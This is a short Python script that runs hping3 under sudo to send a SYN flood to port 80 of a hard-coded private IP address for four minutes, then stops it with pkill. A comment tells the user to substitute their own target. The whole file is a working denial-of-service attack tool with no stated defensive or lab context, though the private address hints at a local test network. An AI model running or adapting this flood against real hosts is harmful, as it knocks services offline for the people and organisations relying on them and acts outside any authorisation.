import sys
import time
import subprocess
import logging


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logging.getLogger().addHandler(logging.StreamHandler(sys.stdout))
try:

        target_ip = "192.168.43.109"  # Replace with the target IP address
        hping3_process1 = subprocess.Popen(
            ["sudo", "hping3", "-S", "-p", "80","-d","1000000000000","--flood", target_ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        logging.info("waiting.....")
        time.sleep(4*60)
        logging.info("killing the process")
        subprocess.run(["pkill", "hping3"])
except KeyboardInterrupt:
        #incase of user interrupting flow
        subprocess.run(["pkill", "hping3"])
        logging.info("user interrupted")
